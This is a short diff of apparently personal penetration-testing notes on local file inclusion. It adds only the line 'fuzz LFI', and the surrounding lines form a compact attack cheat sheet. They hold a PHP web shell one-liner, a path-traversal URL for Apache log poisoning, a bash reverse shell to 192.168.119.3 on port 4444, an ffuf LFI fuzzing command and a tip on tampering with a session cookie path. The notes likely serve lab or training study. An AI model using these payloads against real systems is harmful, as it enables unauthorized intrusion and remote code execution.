@@ -28,6 +28,7 @@ To automate the process, use the following tools
 -     <?php system($_GET['cmd']); ?>
 -     example.com/index.php?view=cat../../../../../../../../../var/log/apache2/access.log
 -     bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+- fuzz LFI
 -     ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> searching for LFI
 - decode (base64) the PHPSESSID --> you will find a path for /var/www/html/index.php --> you can change the path inside the cookie, encode it again then send it 
 - Linux --> /etc/hosts
